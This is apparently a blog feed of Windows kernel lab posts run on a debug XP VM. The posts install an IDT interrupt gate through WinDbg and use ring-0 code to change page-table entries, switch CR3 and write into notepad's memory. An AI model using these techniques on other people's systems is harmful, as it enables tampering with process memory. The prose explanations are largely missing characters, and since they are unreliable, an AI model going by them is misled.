(DWORD64 *) (((x &gt;&gt; 21) &lt;&lt; 3) + 0xc0600000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line">DWORD g_var;</span><br><span class="line">DWORD64 g_pte;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page1[<span class="number">1024</span>];<span class="comment">//0x0041b000</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page2[<span class="number">1024</span>];<span class="comment">//0x0041c000</span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//call</span></span><br><span class="line">    g_pte = *PTE(<span class="number">0x0041c000</span>);</span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = *PTE(<span class="number">0x0041b000</span>) | <span class="number">0x100</span>;<span class="comment">//Global</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov cr3,eax</span><br><span class="line">    &#125;<span class="comment">//tlb</span></span><br><span class="line">    __asm mov eax, ds: [<span class="number">0x0041c000</span>]<span class="comment">//tlbg1</span></span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = g_pte;<span class="comment">//</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, cr3</span><br><span class="line">        mov cr3, eax</span><br><span class="line">    &#125;<span class="comment">//tlbpage2 G1page2page1</span></span><br><span class="line">    <span class="comment">//__asm invlpg ds:[0x0041c000] //g</span></span><br><span class="line">    g_var = page2[<span class="number">0</span>];</span><br><span class="line">    __asm &#123;</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    page1[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    page2[<span class="number">0</span>] = <span class="number">2</span>;<span class="comment">//tlb</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;g_var:%d\n&quot;</span>, g_var);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g_var:1</span><br><span class="line">. . .</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows:</title>
      <link href="/2023/06/03/Windows-Kernel-Experiment-Deferred-memory-allocation/"/>
      <url>/2023/06/03/Windows-Kernel-Experiment-Deferred-memory-allocation/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-"><a href="#Windows-" class="headerlink" title="Windows:"></a>Windows:</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">DWORD var1;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD var2 = <span class="number">1</span>;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//call</span></span><br><span class="line">    __asm&#123;</span><br><span class="line">        mov eax,var2</span><br><span class="line">        mov var1,eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;var2:%p\n&quot;</span>,&amp;var2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;var1:%d\n&quot;</span>,var1);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD var2 = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>sectionvar2section</p><p><a href="https://learn.microsoft.com/zh-cn/cpp/preprocessor/section?view=msvc-170">https://learn.microsoft.com/zh-cn/cpp/preprocessor/section?view=msvc-170</a></p><p><a href="https://learn.microsoft.com/zh-cn/cpp/cpp/allocate?view=msvc-170">https://learn.microsoft.com/zh-cn/cpp/cpp/allocate?view=msvc-170</a></p><p><img src="/2023/06/03/Windows-Kernel-Experiment-Deferred-memory-allocation/image-20230603011009892.png" alt="image-20230603011009892"></p><p>var24k</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">. . .</span><br><span class="line">&amp;var2:<span class="number">0041B</span>000</span><br><span class="line">var1:<span class="number">0</span></span><br><span class="line">. . .</span><br></pre></td></tr></table></figure><p>1<code>mov eax,var2</code>var20</p><p>pausece</p><p><img src="/2023/06/03/Windows-Kernel-Experiment-Deferred-memory-allocation/image-20230603012716985.png" alt="image-20230603012716985"></p><p><strong></strong></p><p>var2</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">DWORD var1;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD var2 = <span class="number">1</span>;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//call</span></span><br><span class="line">    __asm&#123;</span><br><span class="line">        mov eax,var2</span><br><span class="line">        mov var1,eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;var2:%p\n&quot;</span>,&amp;var2);</span><br><span class="line">    interrupt();<span class="comment">//</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;var1:%d\n&quot;</span>,var1);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&amp;var2:<span class="number">0041B</span>000</span><br><span class="line">var1:<span class="number">1</span></span><br><span class="line">. . .</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows:</title>
      <link href="/2023/06/02/Windows-Kernel-Experiment-Parallel-processes/"/>
      <url>/2023/06/02/Windows-Kernel-Experiment-Parallel-processes/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-"><a href="#Windows-" class="headerlink" title="Windows:"></a>Windows:</h1><p>ABcr3BAeip</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><strong>process1.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//0x0041a1c8</span></span><br><span class="line">DWORD g_cr3;</span><br><span class="line">DWORD g_flag;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//call</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, cr3</span><br><span class="line">        mov g_cr3, eax</span><br><span class="line">        iretd</span><br><span class="line">        <span class="comment">//00401048 CFiretd</span></span><br><span class="line">        <span class="comment">//0x401049 CCint3</span></span><br><span class="line">        mov eax, <span class="number">0xffffffff</span></span><br><span class="line">        nop<span class="comment">//0x40104e</span></span><br><span class="line">        nop<span class="comment">//0x40104f</span></span><br><span class="line">        nop<span class="comment">//0x401050</span></span><br><span class="line">        mov eax,<span class="number">0x654321</span></span><br><span class="line">        mov g_flag,eax</span><br><span class="line">        mov ecx,<span class="number">0x666666</span></span><br><span class="line">        mov eax,ds:[<span class="number">0x8003f130</span>]</span><br><span class="line">        mov cr3,eax</span><br><span class="line">        <span class="comment">//00401066 0F 22 D8             mov         cr3,eax  </span></span><br><span class="line">        <span class="comment">//00401069 CC                   int         3  </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;cr3:0x%x\tg_flag:0x%x\n&quot;</span>, g_cr3, g_flag);</span><br><span class="line">        Sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>process2.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//0x0041a1c8</span></span><br><span class="line">DWORD g_num;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//call</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, cr3</span><br><span class="line">        mov ds:[<span class="number">0x8003f130</span>],eax<span class="comment">//8003f130 gdtr</span></span><br><span class="line">        mov eax, <span class="number">0x8d301c0</span><span class="comment">//0x8d301c0 process1cr3</span></span><br><span class="line">        mov cr3, eax</span><br><span class="line">        <span class="comment">//040104E 0F 22 D8    mov         cr3, eax</span></span><br><span class="line">        <span class="comment">//00401051 CC  int         3</span></span><br><span class="line">        mov eax, <span class="number">0xffffffff</span></span><br><span class="line">        mov eax, <span class="number">0xffffffff</span></span><br><span class="line">        mov eax, <span class="number">0xffffffff</span></span><br><span class="line">        mov eax, <span class="number">0xffffffff</span></span><br><span class="line">        <span class="comment">//00401060 B8 FF FF FF FF       mov         eax, 0FFFFFFFFh</span></span><br><span class="line">        nop<span class="comment">//00401065</span></span><br><span class="line">        nop<span class="comment">//00401066</span></span><br><span class="line">        nop<span class="comment">//00401067</span></span><br><span class="line">        nop<span class="comment">//00401068</span></span><br><span class="line">        mov g_num, ecx</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cr3:0x%x\n&quot;</span>,g_num);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>process1cr3gflag0process2gfalg0x654321process2g_num0x66666</p><p><img src="/2023/06/02/Windows-Kernel-Experiment-Parallel-processes/image-20230602235651166.png" alt="image-20230602235651166"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><img src="/2023/06/02/Windows-Kernel-Experiment-Parallel-processes/image-20230603000923428.png" alt="image-20230603000923428"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows:</title>
      <link href="/2023/06/02/Windows-Kernel-Experiment-Interprocess-memory-access/"/>
      <url>/2023/06/02/Windows-Kernel-Experiment-Interprocess-memory-access/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-"><a href="#Windows-" class="headerlink" title="Windows:"></a>Windows:</h1><p>cr3cr3</p><p>notepad</p><p><img src="/2023/06/02/Windows-Kernel-Experiment-Interprocess-memory-access/image-20230602212944955.png" alt="image-20230602212944955"></p><p>ce0xaab30</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !process <span class="number">0</span> <span class="number">0</span> notepad.exe</span><br><span class="line">Failed to get VadRoot</span><br><span class="line">PROCESS <span class="number">8165f</span>350  SessionId: <span class="number">0</span>  Cid: <span class="number">0688</span>    Peb: <span class="number">7f</span>fd8000  ParentCid: <span class="number">04</span>a4</span><br><span class="line">    DirBase: <span class="number">08b</span>d0240  ObjectTable: e14bcae8  HandleCount:  <span class="number">46.</span></span><br><span class="line">    Image: notepad.exe</span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//call</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov ds:[<span class="number">0x8003f130</span>],eax<span class="comment">//8003f130 gdtr</span></span><br><span class="line">        mov eax,<span class="number">0x8bd0240</span> <span class="comment">//08bd0240 notepadcr3</span></span><br><span class="line">        mov cr3,eax  <span class="comment">//</span></span><br><span class="line">        mov eax,<span class="number">0x12345678</span></span><br><span class="line">        mov ds:[<span class="number">0xaab30</span>],eax</span><br><span class="line">        mov eax,ds:[<span class="number">0x8003f130</span>]</span><br><span class="line">        mov cr3,eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mov cr3,eax cr3eipnotepadcr3eipnotepadeipgdt0x8003f140</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span>* Address = (<span class="type">char</span> *)<span class="number">0x8003f140</span>;</span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="type">void</span> <span class="title function_">EditNotepad</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//call</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i++) &#123;</span><br><span class="line">        Address[i] = ((<span class="type">char</span>*)EditNotepad)[i];</span><br><span class="line">    &#125;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x8003f140</span></span><br><span class="line">        ret<span class="comment">// jmp </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) EditNotepad() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, cr3</span><br><span class="line">        mov ds : [<span class="number">0x8003f130</span>] , eax<span class="comment">//8003f130 gdtr</span></span><br><span class="line">        mov eax, <span class="number">0x8bd0240</span> <span class="comment">//08bd0240 notepadcr3</span></span><br><span class="line">        mov cr3, eax</span><br><span class="line">        mov eax, <span class="number">0x12345678</span></span><br><span class="line">        mov ds : [<span class="number">0xaab30</span>] , eax</span><br><span class="line">        mov eax, ds : [<span class="number">0x8003f130</span>]</span><br><span class="line">        mov cr3, eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/06/02/Windows-Kernel-Experiment-Interprocess-memory-access/image-20230602220050054.png" alt="image-20230602220050054"></p><p></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows:</title>
      <link href="/2023/06/02/Windows-Kernel-Experiment-Zero-address-read-write/"/>
      <url>/2023/06/02/Windows-Kernel-Experiment-Zero-address-read-write/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-"><a href="#Windows-" class="headerlink" title="Windows:"></a>Windows:</h1><p>pae</p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !pte <span class="number">0</span></span><br><span class="line">                    VA <span class="number">00000000</span></span><br><span class="line">PDE at C0600000            PTE at C0000000</span><br><span class="line">contains <span class="number">0000000008381067</span>  contains <span class="number">0000000000000000</span></span><br><span class="line">pfn <span class="number">8381</span>      ---DA--UWEV  not valid</span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PDE(x) (DWORD64 *) (((x &gt;&gt; 21) &lt;&lt; 3) + 0xc0600000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line"><span class="comment">//004197B0</span></span><br><span class="line">DWORD g_var = <span class="number">0x12345678</span>;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//call</span></span><br><span class="line">    *PTE(<span class="number">0</span>) = *PTE(<span class="number">0x04197B0</span>);</span><br><span class="line">    __asm &#123;</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;g_var:%p\n&quot;</span>,&amp;g_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;g_var:%x\n&quot;</span>,g_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0:%x\n&quot;</span>,*(DWORD*)<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x7b0:%x\n&quot;</span>,*(DWORD *)<span class="number">0x7b0</span>);</span><br><span class="line">    *(DWORD*)<span class="number">0x7b0</span> = <span class="number">0xffffff</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;g_var:%x\n&quot;</span>,g_var);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&amp;g_var:<span class="number">004197B</span>0</span><br><span class="line">g_var:<span class="number">12345678</span></span><br><span class="line"><span class="number">0</span>:<span class="number">462</span>aabc5</span><br><span class="line"><span class="number">0x7b0</span>:<span class="number">12345678</span></span><br><span class="line">g_var:ffffff</span><br><span class="line">. . .</span><br></pre></td></tr></table></figure><p>4k00419000-0041a0000-1000</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows:PAE(PAE paging)</title>
      <link href="/2023/06/02/Windows-Kernel-Experiment-PAE-paging/"/>
      <url>/2023/06/02/Windows-Kernel-Experiment-PAE-paging/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-PAE-PAE-paging"><a href="#Windows-PAE-PAE-paging" class="headerlink" title="Windows:PAE(PAE paging)"></a>Windows:PAE(PAE paging)</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">multi(<span class="number">0</span>)disk(<span class="number">0</span>)rdisk(<span class="number">0</span>)partition(<span class="number">1</span>)\WINDOWS=<span class="string">&quot;Microsoft Windows XP Home Edition DEBUG&quot;</span> /noexecute=optin /fastdetect /debugport=COM1 /baudrate=<span class="number">115200</span></span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>324g3664g4GPAE</p><p>**PDPT(Page Directory Pointer Table)**36(PDE),(PTE),(PDPTE)8(42<sup>32-12</sup>*4kb&#x3D;4G64G36-12&#x3D;2436bit8byte2<sup>64-12</sup>*4Kb)</p><p><img src="/2023/06/02/Windows-Kernel-Experiment-PAE-paging/image-20230602134150946.png" alt="image-20230602134150946"></p><p>NOTES:</p><ul><li>MMAXPHYADDR()M&#x3D;36</li><li>CR3intel-6464</li><li>0</li><li>XD IA32_EFER.NXE11 ()IA32_EFER.NXE00</li></ul><blockquote><p>PAE2<sup>2</sup>*2<sup>9</sup>*2<sup>9</sup>*4KB&#x3D;4G</p></blockquote><h4 id="PAE"><a href="#PAE" class="headerlink" title="PAE"></a>PAE</h4><p><img src="/2023/06/02/Windows-Kernel-Experiment-PAE-paging/image-20230602135849354.png" alt="image-20230602135849354"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>pae</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">g_cr3:<span class="number">0x8c902a0</span></span><br><span class="line">local num address:<span class="number">004197B</span>0</span><br><span class="line">. . .</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; .formats cr4</span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     <span class="number">000006f</span>9</span><br><span class="line">  Decimal: <span class="number">1785</span></span><br><span class="line">  Decimal (<span class="type">unsigned</span>) : <span class="number">1785</span></span><br><span class="line">  Octal:   <span class="number">00000003371</span></span><br><span class="line">  Binary:  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000110</span> <span class="number">11111001</span></span><br><span class="line">  Chars:   ....</span><br><span class="line">  Time:    Thu Jan  <span class="number">1</span> <span class="number">08</span>:<span class="number">29</span>:<span class="number">45</span> <span class="number">1970</span></span><br><span class="line">  Float:   low <span class="number">2.50132e-042</span> high <span class="number">0</span></span><br><span class="line">  Double:  <span class="number">8.81907e-321</span></span><br></pre></td></tr></table></figure><p>cr4pae1 pae</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!process 0 0 test.exe</span></span><br><span class="line">Failed to get VadRoot</span><br><span class="line">PROCESS 815b6020  SessionId: 0  Cid: 0154    Peb: 7ffd3000  ParentCid: 04b8</span><br><span class="line">    DirBase: 08c902a0  ObjectTable: e24c4a90  HandleCount:  17.</span><br><span class="line">    Image: test.exe</span><br><span class="line"><span class="meta 